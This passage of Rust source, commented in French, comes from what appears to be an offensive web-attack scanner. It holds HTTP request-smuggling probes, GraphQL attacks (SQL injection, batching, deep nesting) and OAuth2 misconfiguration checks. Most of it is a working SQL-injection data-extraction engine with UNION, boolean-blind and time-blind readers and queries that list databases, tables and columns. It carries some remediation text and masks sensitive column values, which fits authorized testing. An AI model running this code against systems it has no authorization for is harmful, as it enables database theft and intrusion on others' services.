                    "  \x1b[38;5;196m[SMUGGLING]\x1b[0m {} status={} delta={}ms",
                    base_url,
                    status,
                    smuggle_ms as i64 - baseline_ms as i64
                );
                vulns.push(WebVuln {
                    vuln_type:   "HTTP Request Smuggling (CL.TE probe)".into(),
                    url:         base_url.to_string(),
                    parameter:   "Transfer-Encoding header".into(),
                    payload:     "TE: chunked + TE: x-chunked + CL mismatch".into(),
                    evidence:    format!("Status {} | delta={}ms (baseline={}ms)", status, smuggle_ms, baseline_ms),
                    severity:    severity.to_string(),
                    confidence:  if smuggle_ms > baseline_ms + 3000 { 0.75 } else { 0.50 },
                    remediation: "Normaliser les en-têtes Transfer-Encoding au niveau du reverse proxy. \
                                  Utiliser HTTP/2 end-to-end. Rejeter les requêtes avec CL+TE ambigus.".into(),
                });
            }
        }
        Err(_) => {
            // Timeout = fort indicateur CL.TE
            if smuggle_ms > baseline_ms + 4000 {
                vulns.push(WebVuln {
                    vuln_type:   "HTTP Request Smuggling (CL.TE timeout)".into(),
                    url:         base_url.to_string(),
                    parameter:   "Content-Length + Transfer-Encoding".into(),
                    payload:     "CL.TE desync probe".into(),
                    evidence:    format!("Timeout {}ms vs baseline {}ms — désynchronisation probable", smuggle_ms, baseline_ms),
                    severity:    "HIGH".into(),
                    confidence:  0.80,
                    remediation: "Implémenter H2C upgrade, normaliser Transfer-Encoding au niveau du load balancer.".into(),
                });
            }
        }
    }

    // ── TE.CL : Transfer-Encoding pris par le front, Content-Length par le back
    let t2 = std::time::Instant::now();
    let _ = client
        .post(base_url)
        .header("Content-Length", "3")
        .header("Transfer-Encoding", "chunked")
        .body("8\r\nSMUGGLED\r\n0\r\n\r\n")
        .send()
        .await;
    let te_cl_ms = t2.elapsed().as_millis();

    if te_cl_ms > baseline_ms + 4000 {
        vulns.push(WebVuln {
            vuln_type:   "HTTP Request Smuggling (TE.CL)".into(),
            url:         base_url.to_string(),
            parameter:   "Transfer-Encoding + Content-Length".into(),
            payload:     "8\\r\\nSMUGGLED\\r\\n0\\r\\n\\r\\n".into(),
            evidence:    format!("Timeout TE.CL {}ms vs baseline {}ms", te_cl_ms, baseline_ms),
            severity:    "CRITICAL".into(),
            confidence:  0.78,
            remediation: "Désactiver la mise en mémoire tampon au niveau du reverse proxy. \
                          Forcer HTTP/2 ou utiliser des connexions persistantes avec un seul backend.".into(),
        });
    }

    // Supprimer les doublons (même vuln_type)
    vulns.dedup_by(|a, b| a.vuln_type == b.vuln_type);
    vulns
}

// ═════════════════════════════════════════════════════════════════════════════
// GraphQL — Introspection + Injection
// ═════════════════════════════════════════════════════════════════════════════

/// Teste les endpoints GraphQL : introspection, injection, IDOR, batching
pub async fn scan_graphql(base_url: &str, cfg: &WebAttackConfig) -> Vec<WebVuln> {
    let client = build_client(cfg);
    let mut vulns = Vec::new();

    // Endpoints GraphQL communs
    let endpoints = [
        "/graphql",
        "/api/graphql",
        "/v1/graphql",
        "/query",
        "/gql",
        "/graphiql",
    ];
    let mut gql_url = base_url.to_string();

    // Détecter l'endpoint GraphQL
    for ep in &endpoints {
        let test = format!("{}{}", base_url.trim_end_matches('/'), ep);
        let introspect_query =
            r#"{"query":"{\n  __schema {\n    types {\n      name\n    }\n  }\n}"}"#;
        if let Some((_, body, _)) = http_post_raw(
            &client,
            &test,
            introspect_query,
            Some("application/json"),
            cfg.retries,
        )
        .await
        {
            if body.contains("__schema")
                || body.contains("QueryType")
                || body.contains("data") && body.contains("types")
            {
                gql_url = test.clone();
                println!("  \x1b[32m[GraphQL]\x1b[0m Endpoint découvert: {}", gql_url);

                // 1. Introspection activée (info disclosure)
                vulns.push(WebVuln {
                    vuln_type: "GraphQL Introspection Enabled".into(),
                    url: gql_url.clone(),
                    parameter: "__schema".into(),
                    payload: introspect_query.to_string(),
                    evidence: "Schéma complet exposé via introspection".into(),
                    severity: "MEDIUM".into(),
                    confidence: 0.97,
                    remediation: "Désactiver l'introspection en production. \
                                  Utiliser persisted queries. Implémenter depth limiting."
                        .into(),
                });
                break;
            }
        }
    }

    if gql_url == base_url {
        return vulns;
    }

    // 2. Batch query attack (DoS potentiel)
    let batch_query = r#"[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]"#;
    if let Some((_, body, _)) = http_post_raw(
        &client,
        &gql_url,
        batch_query,
        Some("application/json"),
        cfg.retries,
    )
    .await
    {
        if body.starts_with('[') && body.contains("__typename") {
            println!(
                "  \x1b[33m[GraphQL BATCH]\x1b[0m Batching activé sur {}",
                gql_url
            );
            vulns.push(WebVuln {
                vuln_type: "GraphQL Batching (DoS Risk)".into(),
                url: gql_url.clone(),
                parameter: "batch query array".into(),
                payload: "5x queries in one request".into(),
                evidence: "Serveur traite les requêtes en batch → amplification DoS possible"
                    .into(),
                severity: "MEDIUM".into(),
                confidence: 0.88,
                remediation:
                    "Limiter le nombre de requêtes par batch. Implémenter rate limiting par IP."
                        .into(),
            });
        }
    }

    // 3. SQLi dans les arguments GraphQL
    let sqli_gql = r#"{"query":"{ user(id: \"1 OR 1=1--\") { id name email } }"}"#;
    if let Some((_, body, _)) = http_post_raw(
        &client,
        &gql_url,
        sqli_gql,
        Some("application/json"),
        cfg.retries,
    )
    .await
    {
        let body_l = body.to_lowercase();
        if body_l.contains("sql")
            || body_l.contains("syntax")
            || body_l.contains("mysql")
            || body_l.contains("postgresql")
        {
            vulns.push(WebVuln {
                vuln_type:   "GraphQL SQLi (Error-Based)".into(),
                url:         gql_url.clone(),
                parameter:   "user(id:)".into(),
                payload:     "1 OR 1=1--".into(),
                evidence:    "Erreur SQL visible dans la réponse GraphQL".into(),
                severity:    "CRITICAL".into(),
                confidence:  0.85,
                remediation: "Utiliser des requêtes préparées dans les resolvers. Valider les entrées GraphQL.".into(),
            });
        }
    }

    // 4. Depth limit bypass (nested query attack)
    let deep_query =
        r#"{"query":"{ user { friends { friends { friends { friends { id name } } } } } }"}"#;
    // P1.1 — le timing n'est exploité que si la requête a réellement abouti
    // (une erreur réseau ne doit pas être confondue avec un délai serveur).
    if let Some((_, _, elapsed)) = http_post_raw(
        &client,
        &gql_url,
        deep_query,
        Some("application/json"),
        cfg.retries,
    )
    .await
    {
        if elapsed > 5000 {
            vulns.push(WebVuln {
                vuln_type:   "GraphQL Depth Attack (DoS)".into(),
                url:         gql_url.clone(),
                parameter:   "nested query depth".into(),
                payload:     "4-level nested user.friends query".into(),
                evidence:    format!("Délai {}ms pour requête profonde — pas de depth limiting", elapsed),
                severity:    "HIGH".into(),
                confidence:  0.80,
                remediation: "Implémenter graphql-depth-limit. Limiter la profondeur à 5 niveaux max.".into(),
            });
        }
    }

    vulns
}

// ═════════════════════════════════════════════════════════════════════════════
// OAuth2 Misconfigurations
// ═════════════════════════════════════════════════════════════════════════════

/// Teste les misconfigrations OAuth2 : state bypass, token leakage, open redirect dans redirect_uri
pub async fn scan_oauth2(base_url: &str, cfg: &WebAttackConfig) -> Vec<WebVuln> {
    let client = build_client(cfg);
    let mut vulns = Vec::new();

    // Endpoints OAuth2 courants
    let oauth_patterns = [
        "/oauth/authorize",
        "/oauth2/authorize",
        "/auth/authorize",
        "/connect/authorize",
        "/api/oauth/authorize",
        "/.well-known/openid-configuration",
    ];

    for endpoint in &oauth_patterns {
        let url = format!("{}{}", base_url.trim_end_matches('/'), endpoint);
        // P1.1 : retry/backoff sur erreur réseau (les en-têtes sont conservés pour `Location`)
        let (status, _hmap, body) = match http_get_headers(&client, &url, &[], cfg.retries).await {
            Some(r) => r,
            None => continue,
        };

        if status == 404 || status == 500 {
            continue;
        }

        // Découverte d'un endpoint OAuth2
        println!(
            "  \x1b[32m[OAuth2]\x1b[0m Endpoint découvert: {} ({})",
            url, status
        );

        // 1. Open redirect dans redirect_uri (OPSEC : domaine réservé IANA)
        let oob_redirect = format!(
            "{}?response_type=code&client_id=test&redirect_uri=https://example.org&state=abc123&scope=openid",
            url
        );
        if let Some((_, hmap, _)) = http_get_headers(&client, &oob_redirect, &[], cfg.retries).await
        {
            let loc = hmap
                .get("location")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("")
                .to_string();
            if loc.contains("example.org") {
                vulns.push(WebVuln {
                    vuln_type: "OAuth2 Open Redirect (redirect_uri)".into(),
                    url: oob_redirect,
                    parameter: "redirect_uri".into(),
                    payload: "https://example.org".into(),
                    evidence: format!("Redirection vers example.org autorisée: {:.100}", loc),
                    severity: "CRITICAL".into(),
                    confidence: 0.95,
                    remediation: "Valider redirect_uri contre liste blanche stricte. \
                                  Rejeter les valeurs non enregistrées."
                        .into(),
                });
            }
        }

        // 2. State parameter absent ou non validé (CSRF sur OAuth)
        let no_state_url = format!(
            "{}?response_type=code&client_id=test&redirect_uri={}/callback&scope=openid",
            url, base_url
        );
        if let Some((status, hmap, _)) =
            http_get_headers(&client, &no_state_url, &[], cfg.retries).await
        {
            let loc = hmap
                .get("location")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("")
                .to_string();
            if (300..400).contains(&status) && !loc.contains("state=") {
                vulns.push(WebVuln {
                    vuln_type: "OAuth2 Missing State Parameter (CSRF)".into(),
                    url: no_state_url,
                    parameter: "state".into(),
                    payload: "(absent)".into(),
                    evidence:
                        "Requête OAuth2 sans state acceptée — CSRF possible sur flow d'autorisation"
                            .into(),
                    severity: "HIGH".into(),
                    confidence: 0.80,
                    remediation:
                        "Toujours inclure et valider le paramètre state (nonce cryptographique) \
                                  pour prévenir les attaques CSRF OAuth2."
                            .into(),
                });
            }
        }

        // 3. Token leakage dans les logs / referrer (response_type=token)
        let implicit_url = format!(
            "{}?response_type=token&client_id=test&redirect_uri={}/callback&scope=openid",
            url, base_url
        );
        if let Some((_, hmap, _)) = http_get_headers(&client, &implicit_url, &[], cfg.retries).await
        {
            let loc = hmap
                .get("location")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("")
                .to_string();
            if loc.contains("access_token=") {
                vulns.push(WebVuln {
                    vuln_type:   "OAuth2 Implicit Flow (Token in URL)".into(),
                    url:         implicit_url,
                    parameter:   "response_type".into(),
                    payload:     "token".into(),
                    evidence:    "access_token visible dans l'URL de redirection → leakage via Referrer/logs".into(),
                    severity:    "HIGH".into(),
                    confidence:  0.90,
                    remediation: "Utiliser le flow Authorization Code + PKCE. Éviter le flux implicite (deprecated RFC 6749).".into(),
                });
            }
        }

        // Analyse du discovery document OpenID
        if endpoint.contains("openid-configuration") && !body.is_empty() {
            if body.contains("\"implicit\"") || body.contains("\"token\"") {
                vulns.push(WebVuln {
                    vuln_type: "OAuth2 Implicit Flow Supported".into(),
                    url: url.clone(),
                    parameter: "grant_types_supported".into(),
                    payload: "implicit".into(),
                    evidence: "OpenID configuration indique support du flux implicite (déprécié)"
                        .into(),
                    severity: "MEDIUM".into(),
                    confidence: 0.88,
                    remediation:
                        "Supprimer le flux implicite de grant_types_supported. Migrer vers PKCE."
                            .into(),
                });
            }
        }

        break; // Un endpoint suffit pour les tests principaux
    }
    vulns
}

// ─────────────────────────────────────────────────────────────────────────────
// Extraction de données post-exploitation (SQLi blind, LFI, CMDi)
// ─────────────────────────────────────────────────────────────────────────────

/// Future boxée (pinnée) : permet de typer les oracles de `blind_extract`,
/// qui rendent un `Future` différent à chaque invocation de closure.
type BoxFut<'a, T> = std::pin::Pin<Box<dyn std::future::Future<Output = T> + Send + 'a>>;

/// Alphabet réduit des identifiants (schémas, tables, colonnes, base courante).
const IDENT_CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyz_0123456789.-";

/// Alphabet des données : tout l'ASCII imprimable.
fn data_charset() -> Vec<char> {
    (0x20u8..0x7f).map(|b| b as char).collect()
}

/// Tronque une chaîne à `max` caractères (par caractère, pas par octet).
fn truncate_chars(s: &str, max: usize) -> String {
    s.chars().take(max).collect()
}

// ── Moteur d'extraction : sélection et exploitation de l'oracle ─────────────

/// Durée (secondes) des délais injectés pour les sondes time-based.
const TIME_SLEEP_SECS: u32 = 3;
/// Marge (ms) ajoutée à la latence de référence pour décider qu'une réponse a
/// effectivement dormi. Aligné sur le seuil de confirmation de la détection.
const TIME_DELTA_MS: u128 = 1800;
/// Nombre de colonnes maximales testées pour une injection `UNION SELECT`.
const UNION_MAX_COLS: usize = 12;

/// Envoie un payload et rend la latence observée (ms). **Aucun retry** : rejouer
/// une sonde time-based fausserait la mesure (et allongerait inutilement le scan).
async fn send_payload_time(
    client: &Client,
    base_url: &str,
    param: &str,
    payload: &str,
    injection: &str,
) -> Option<u128> {
    if injection == "POST" {
        http_post_form(client, base_url, &[(param, payload)], 1)
            .await
            .map(|(_, _, t)| t)
    } else {
        let url = format!("{}?{}={}", base_url, param, urlencoding::encode(payload));
        http_get(client, &url, 1).await.map(|(_, _, t)| t)
    }
}

/// Valeur injectée faisant dormir la réponse *si* `cond` est vraie.
///
/// Contrairement à `sqli_condition_payload` (booléen, séparateur `AND`), MSSQL
/// exige un `;` avant `WAITFOR` qui est une instruction et non une expression.
fn sqli_time_payload(seed: &str, ctx: &SqliContext, cond: &str, seconds: u32) -> Option<String> {
    let q = ctx.quote;
    let p = if ctx.paren { ")" } else { "" };
    let s = seconds.clamp(1, 10);
    let sep = if ctx.dbms == Some("mssql") {
        ";"
    } else {
        " AND "
    };
    let body = match ctx.dbms {
        Some("postgres") => format!("CASE WHEN ({cond}) THEN pg_sleep({s}) ELSE pg_sleep(0) END"),
        Some("mssql") => format!("IF ({cond}) WAITFOR DELAY '0:0:{s}'"),
        // Oracle ne dispose pas de primitive de délai portable ; SQLite non plus.
        Some("oracle") | Some("sqlite") => return None,
        _ => format!("IF(({cond}),SLEEP({s}),0)"),
    };
    Some(format!("{seed}{q}{p}{sep}{body}{}", ctx.comment))
}

/// Valeur injectée plaçant `select_list` en union avec la requête d'origine.
fn sqli_union_payload(seed: &str, ctx: &SqliContext, select_list: &str) -> String {
    let p = if ctx.paren { ")" } else { "" };
    format!(
        "{seed}{}{} UNION SELECT {}{}",
        ctx.quote, p, select_list, ctx.comment
    )
}

/// Liste de colonnes d'un `UNION SELECT` : `NULL` partout, sauf en `visible`.
fn union_select_list(columns: usize, visible: usize, value: &str) -> String {
    (1..=columns)
        .map(|i| {
            if i == visible {
                value.to_string()
            } else {
                "NULL".to_string()
            }
        })
        .collect::<Vec<_>>()
        .join(",")
}

/// Concaténation dialecte-dépendante : encadre la valeur lue par 2 marqueurs.
fn sql_concat(dbms: Option<&str>, prefix: &str, expr: &str, suffix: &str) -> String {
    match dbms {
        Some("mssql") => format!("'{prefix}'+CONVERT(varchar,({expr}))+'{suffix}'"),
        // `||` est le concaténateur standard de PostgreSQL, SQLite et Oracle.
        Some("sqlite") | Some("postgres") | Some("oracle") => {
            format!("'{prefix}'||({expr})||'{suffix}'")
        }
        _ => format!("CONCAT('{prefix}',({expr}),'{suffix}')"),
    }
}

/// Lecteur UNION : la valeur est lue directement dans le corps de la réponse,
/// encadrée par des marqueurs uniques pour la délimiter sans ambiguïté.
#[derive(Clone)]
struct UnionReader {
    client: Client,
    base_url: String,
    param: String,
    injection: String,
    ctx: SqliContext,
    /// Nombre de colonnes de la requête d'origine (`ORDER BY`).
    columns: usize,
    /// Index (base 1) de la colonne dont la valeur est reflétée dans la page.
    visible: usize,
    /// Nonce rendant préfixe/suffixe et marqueurs de détection non falsifiables
    /// par une occurrence fortuite dans le HTML.
    nonce: String,
}

impl UnionReader {
    /// Détermine le nombre de colonnes (`ORDER BY`) puis la colonne visible, et
    /// n'engage le vecteur UNION que si les deux sont établis sans ambiguïté.
    async fn establish(
        client: &Client,
        base_url: &str,
        param: &str,
        injection: &str,
        ctx: &SqliContext,
    ) -> Option<Self> {
        let send = |payload: String| {
            let client = client.clone();
            let base_url = base_url.to_string();
            let param = param.to_string();
            let injection = injection.to_string();
            async move {
                if injection == "POST" {
                    http_post_form(&client, &base_url, &[(param.as_str(), payload.as_str())], 1)
                        .await
                        .map(|(_, b, _)| b)
                } else {
                    let url = format!("{}?{}={}", base_url, param, urlencoding::encode(&payload));
                    http_get(&client, &url, 1).await.map(|(_, b, _)| b)
                }
            }
        };

        // 1. Nombre de colonnes : `ORDER BY n` réussit jusqu'au rang N, échoue au-delà.
        let p = if ctx.paren { ")" } else { "" };
        let mut columns = 0usize;
        for n in 1..=UNION_MAX_COLS {
            let payload = format!("1{}{} ORDER BY {}{}", ctx.quote, p, n, ctx.comment);
            let body = send(payload).await?;
            if contains_strict_sqli_error(&body.to_lowercase()) {
                break;
            }
            columns = n;
        }
        if columns == 0 {
            return None;
        }

        // 2. Colonne visible : un marqueur distinct par position, on retient la
        //    première dont le reflet apparaît dans la page.
        let nonce = format!("nrtg{:x}", rand::random::<u32>());
        for i in 1..=columns {
            let marker = format!("{}m{}", nonce, i);
            let list = union_select_list(columns, i, &format!("'{}'", marker));
            let body = send(sqli_union_payload("1", ctx, &list)).await?;
            if body.contains(&marker) {
                return Some(Self {
                    client: client.clone(),
                    base_url: base_url.to_string(),
                    param: param.to_string(),
                    injection: injection.to_string(),
                    ctx: ctx.clone(),
                    columns,
                    visible: i,
                    nonce,
                });
            }
        }
        None
    }

    /// Lit directement la valeur de `expr` dans la page (entre les 2 marqueurs).
    async fn read(&self, expr: &str) -> Option<String> {
        let prefix = format!("{}p", self.nonce);
        let suffix = format!("{}s", self.nonce);
        let value = sql_concat(self.ctx.dbms, &prefix, expr, &suffix);
        let list = union_select_list(self.columns, self.visible, &value);
        let payload = sqli_union_payload("1", &self.ctx, &list);

        let body = if self.injection == "POST" {
            http_post_form(
                &self.client,
                &self.base_url,
                &[(self.param.as_str(), payload.as_str())],
                1,
            )
            .await
            .map(|(_, b, _)| b)?
        } else {
            let url = format!(
                "{}?{}={}",
                self.base_url,
                self.param,
                urlencoding::encode(&payload)
            );
            http_get(&self.client, &url, 1).await.map(|(_, b, _)| b)?
        };

        // `find` renvoie toujours un index sur frontière de caractère : la
        // découpe est sûre même si le corps contient de l'UTF-8.
        let start = body.find(&prefix)? + prefix.len();
        let rest = &body[start..];
        let end = rest.find(&suffix)?;
        Some(rest[..end].to_string())
    }
}

/// Nature de l'oracle booléen porté par un `BlindReader`.
#[derive(Debug, Clone, Copy)]
enum Truth {
    /// Vrai si la longueur du corps est plus proche du cas `TRUE` que du `FALSE`.
    Length { true_len: usize, false_len: usize },
    /// Vrai si la latence dépasse la référence + la marge (`TIME_DELTA_MS`).
    Delay { baseline_ms: u128, delta_ms: u128 },
}

/// Lecteur aveugle : reconstruit la valeur position par position. L'oracle est
/// soit un différentiel de longueur, soit un différentiel de latence.
#[derive(Clone)]
struct BlindReader {
    client: Client,
    base_url: String,
    param: String,
    injection: String,
    ctx: SqliContext,
    dialect: SqliDialect,
    truth: Truth,
    retries: usize,
    sleep_secs: u32,
}

impl BlindReader {
    fn label(&self) -> &'static str {
        match self.truth {
            Truth::Length { .. } => "boolean-blind",
            Truth::Delay { .. } => "time-blind",
        }
    }

    /// Payload et budget de tentatives pour la condition `cond`.
    fn request(&self, cond: &str) -> Option<(String, usize)> {
        match self.truth {
            Truth::Length { .. } => Some((
                sqli_condition_payload("1", &self.ctx, cond),
                self.retries.max(1),
            )),
            // Jamais de retry sur les sondes time-based.
            Truth::Delay { .. } => {
                Some((sqli_time_payload("1", &self.ctx, cond, self.sleep_secs)?, 1))
            }
        }
    }

    /// Vérité de `cond` telle que rapportée par l'oracle.
    async fn truth_of(&self, cond: &str) -> Option<bool> {
        let (payload, attempts) = self.request(cond)?;
        match self.truth {
            Truth::Length {
                true_len,
                false_len,
            } => {
                let len = send_payload_len(
                    &self.client,
                    &self.base_url,
                    &self.param,
                    &payload,
                    &self.injection,
                    attempts,
                )
                .await?;
                Some(is_true(len, true_len, false_len))
            }
            Truth::Delay {
                baseline_ms,
                delta_ms,
            } => {
                let t = send_payload_time(
                    &self.client,
                    &self.base_url,
                    &self.param,
                    &payload,
                    &self.injection,
                )
                .await?;
                Some(t >= baseline_ms + delta_ms)
            }
        }
    }

    /// Longueur de `expr` : plus petit `n` tel que `LENGTH(expr)=n` soit vraie.
    async fn len_of(&self, expr: &str, max_len: usize) -> Option<usize> {
        for n in 0..=max_len {
            let cond = format!("{}={}", self.dialect.len_expr(expr), n);
            match self.truth_of(&cond).await {
                Some(true) => return Some(n),
                Some(false) => continue,
                None => return None,
            }
        }
        None
    }

    /// Le caractère à la position `i` (base 0) de `expr` vaut-il `c` ?
    async fn char_eq(&self, expr: &str, i: usize, c: char) -> Option<bool> {
        let cond = format!(
            "{}='{}'",
            self.dialect.substr_expr(expr, i + 1),
            escape_char(c)
        );
        self.truth_of(&cond).await
    }

    /// Reconstruction complète via `blind_extract` (même marche, mêmes arrêts).
    async fn read(&self, expr: &str, charset: &[char], max_len: usize) -> Option<String> {
        let len_reader = self.clone();
        let len_expr = expr.to_string();
        let chr_reader = self.clone();
        let chr_expr = expr.to_string();
        blind_extract(
            charset,
            max_len,
            move || {
                let r = len_reader.clone();
                let e = len_expr.clone();
                Box::pin(async move { r.len_of(&e, max_len).await })
            },
            move |i, c| {
                let r = chr_reader.clone();
                let e = chr_expr.clone();
                Box::pin(async move { r.char_eq(&e, i, c).await })
            },
        )
        .await
    }
}

/// Lecteur retenu après sélection de l'oracle exploitable.
#[derive(Clone)]
enum SqliReader {
    Union(UnionReader),
    Blind(BlindReader),
}

impl SqliReader {
    /// Libellé du vecteur, journalisé dans `SqliExtraction::technique`.
    fn label(&self) -> &'static str {
        match self {
            SqliReader::Union(_) => "UNION",
            SqliReader::Blind(b) => b.label(),
        }
    }

    /// Lit `expr` par le vecteur retenu, résultat tronqué à `max_len` caractères.
    async fn read(&self, expr: &str, charset: &[char], max_len: usize) -> Option<String> {
        let raw = match self {
            SqliReader::Union(u) => u.read(expr).await,
            SqliReader::Blind(b) => b.read(expr, charset, max_len).await,
        }?;
        Some(truncate_chars(&raw, max_len))
    }
}

/// Sélectionne le premier oracle exploitable : UNION, puis boolean blind, puis
/// time-based. Rend `None` si aucun n'est concluant (aucune extraction possible).
async fn select_reader(
    client: &Client,
    base_url: &str,
    param: &str,
    injection: &str,
    ctx: &SqliContext,
    dialect: &SqliDialect,
    cfg: &WebAttackConfig,
) -> Option<SqliReader> {
    // 1. UNION : lecture directe, de loin le vecteur le plus rapide et le plus sûr.
    if let Some(u) = UnionReader::establish(client, base_url, param, injection, ctx).await {
        println!(
            "  \x1b[35m[SQLi]\x1b[0m vecteur UNION établi (colonne visible {}/{}) sur param={}",
            u.visible, u.columns, param
        );
        return Some(SqliReader::Union(u));
    }

    let blind = |truth: Truth| {
        SqliReader::Blind(BlindReader {
            client: client.clone(),
            base_url: base_url.to_string(),
            param: param.to_string(),
            injection: injection.to_string(),
            ctx: ctx.clone(),
            dialect: *dialect,
            truth,
            retries: cfg.retries,
            sleep_secs: TIME_SLEEP_SECS,
        })
    };

    // 2. Boolean blind : oracle différentiel de longueur de corps.
    let true_len = send_payload_len(
        client,
        base_url,
        param,
        &sqli_condition_payload("1", ctx, "1=1"),
        injection,
        cfg.retries,
    )
    .await;
    let false_len = send_payload_len(
        client,
        base_url,
        param,
        &sqli_condition_payload("1", ctx, "1=2"),
        injection,
        cfg.retries,
    )
    .await;
    if let (Some(true_len), Some(false_len)) = (true_len, false_len) {
        if diff_ratio(true_len, false_len) <= 0.98 {
            return Some(blind(Truth::Length {
                true_len,
                false_len,
            }));
        }
    }

    // 3. Time-based blind : repli sur le délai, sans retry.
    if dialect.sleep_fn.is_some() {
        let p_false = sqli_time_payload("1", ctx, "1=2", TIME_SLEEP_SECS)?;
        let p_true = sqli_time_payload("1", ctx, "1=1", TIME_SLEEP_SECS)?;
        let baseline = send_payload_time(client, base_url, param, &p_false, injection).await?;
        let first = send_payload_time(client, base_url, param, &p_true, injection).await?;
        let second = send_payload_time(client, base_url, param, &p_true, injection).await?;
        // Confirmation sur 2 échantillons : le délai doit être franc et reproductible.
        if first >= baseline + TIME_DELTA_MS && second >= baseline + TIME_DELTA_MS {
            return Some(blind(Truth::Delay {
                baseline_ms: baseline,
                delta_ms: TIME_DELTA_MS,
            }));
        }
    }

    None
}

/// Extraction booléenne aveugle position par position.
///
/// L'oracle est porté par les closures : `len_of` rend la longueur de la donnée
/// et `char_eq(i, c)` dit si le caractère à la position `i` (base 0) vaut `c`.
/// Toute incertitude (`None`) ou caractère hors alphabet arrête la marche et
/// rend le préfixe déjà acquis — jamais d'erreur, jamais de boucle infinie.
pub async fn blind_extract(
    charset: &[char],
    max_len: usize,
    mut len_of: impl FnMut() -> BoxFut<'static, Option<usize>>,
    mut char_eq: impl FnMut(usize, char) -> BoxFut<'static, Option<bool>>,
) -> Option<String> {
    let len = len_of().await?.min(max_len);
    if len == 0 {
        return Some(String::new());
    }

    let mut out = String::new();
    for i in 0..len {
        let mut found = None;
        for &c in charset {
            match char_eq(i, c).await {
                Some(true) => {
                    found = Some(c);
                    break;
                }
                Some(false) => continue,
                // Oracle indéterminé : on restitue ce qui est déjà acquis.
                None => return Some(out),
            }
        }
        match found {
            Some(c) => out.push(c),
            // Caractère absent de l'alphabet : on s'arrête proprement.
            None => return Some(out),
        }
    }
    Some(out)
}

/// Dialecte SQL : primitives de longueur, sous-chaîne et délai propres au SGBD.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SqliDialect {
    pub length_fn: &'static str,
    pub substr_fn: &'static str,
    pub sleep_fn: Option<&'static str>,
}

impl SqliDialect {
    /// Sélectionne le dialecte d'après le SGBD détecté (défaut = MySQL).
    pub fn for_dbms(dbms: Option<&str>) -> Self {
        match dbms {
            Some("postgres") => Self {
                length_fn: "LENGTH",
                substr_fn: "SUBSTRING",
                sleep_fn: Some("PG_SLEEP"),
            },
            Some("mssql") => Self {
                length_fn: "LEN",
                substr_fn: "SUBSTRING",
                sleep_fn: Some("WAITFOR"),
            },
            Some("oracle") => Self {
                length_fn: "LENGTH",
                substr_fn: "SUBSTR",
                sleep_fn: None,
            },
            Some("sqlite") => Self {
                length_fn: "LENGTH",
                substr_fn: "SUBSTR",
                sleep_fn: None,
            },
            _ => Self {
                length_fn: "LENGTH",
                substr_fn: "SUBSTRING",
                sleep_fn: Some("SLEEP"),
            },
        }
    }

    /// Expression de longueur : `LENGTH(expr)`.
    pub fn len_expr(&self, expr: &str) -> String {
        format!("{}({})", self.length_fn, expr)
    }

    /// Expression d'un caractère à la position `pos` (base 1) : `SUBSTRING(expr,pos,1)`.
    pub fn substr_expr(&self, expr: &str, pos: usize) -> String {
        format!("{}({},{},1)", self.substr_fn, expr, pos)
    }
}

/// Construit la valeur injectée portant la condition booléenne `cond`.
///
/// Le guillemet (et l'éventuelle parenthèse) sont repris du contexte détecté
/// pour refermer proprement la chaîne/l'expression SQL d'origine.
pub fn sqli_condition_payload(seed: &str, ctx: &SqliContext, cond: &str) -> String {
    if ctx.paren {
        format!("{}{}) AND {}{}", seed, ctx.quote, cond, ctx.comment)
    } else {
        format!("{}{} AND {}{}", seed, ctx.quote, cond, ctx.comment)
    }
}

/// Indique si un nom de colonne est de nature sensible (à masquer).
pub fn is_sensitive_column(name: &str) -> bool {
    let n = name.to_lowercase();
    [
        "pass", "pwd", "secret", "token", "api_key", "apikey", "hash", "salt", "private",
    ]
    .iter()
    .any(|k| n.contains(k))
}

/// Masque une valeur extraite : 4 caractères de tête puis `***`.
/// Une valeur de ≤ 4 caractères devient `***` (rien de réutilisable).
pub fn mask_extracted(value: &str) -> String {
    if value.chars().count() <= 4 {
        return "***".to_string();
    }
    let head: String = value.chars().take(4).collect();
    format!("{}***", head)
}

/// Échappe un identifiant SQL (table/colonne) : `'` doublé.
fn sql_escape_ident(ident: &str) -> String {
    ident.replace('\'', "''")
}

/// Échappe un caractère pour une chaîne SQL littérale (`'` doublé).
fn escape_char(c: char) -> String {
    c.to_string().replace('\'', "''")
}

/// Oracle différentiel : longueur observée plus proche du cas `TRUE` que du `FALSE`.
fn is_true(len: usize, true_len: usize, false_len: usize) -> bool {
    len.abs_diff(true_len) < len.abs_diff(false_len)
}

// ── Requêtes de métadonnées (index `i` = ligne visée) ───────────────────────

/// Schémas/bases de données.
fn databases_query(dbms: Option<&str>, i: usize) -> Option<String> {
    match dbms {
        Some("postgres") => Some(format!(
            "SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {}", i)),
        Some("mssql") => Some(format!(
            "SELECT name FROM sys.databases ORDER BY database_id OFFSET {} ROWS FETCH NEXT 1 ROWS ONLY", i)),
        Some("oracle") | Some("sqlite") => None,
        _ => Some(format!(
            "SELECT schema_name FROM information_schema.schemata LIMIT {},1", i)),
    }
}

/// Tables de la base courante.
fn tables_query(dbms: Option<&str>, i: usize) -> Option<String> {
    match dbms {
        Some("postgres") => Some(format!(
            "SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {}", i)),
        Some("mssql") => Some(format!(
            "SELECT name FROM sys.tables ORDER BY name OFFSET {} ROWS FETCH NEXT 1 ROWS ONLY", i)),
        Some("oracle") | Some("sqlite") => None,
        _ => Some(format!(
            "SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {},1", i)),
    }
}

/// Colonnes d'une table.
fn columns_query(dbms: Option<&str>, table: &str, i: usize) -> Option<String> {
    let t = sql_escape_ident(table);
    match dbms {
        Some("postgres") => Some(format!(
            "SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT 1 OFFSET {}", t, i)),
        Some("mssql") => Some(format!(
            "SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('{}') ORDER BY column_id OFFSET {} ROWS FETCH NEXT 1 ROWS ONLY", t, i)),
        Some("oracle") | Some("sqlite") => None,
        _ => Some(format!(
            "SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {},1", t, i)),
    }
}

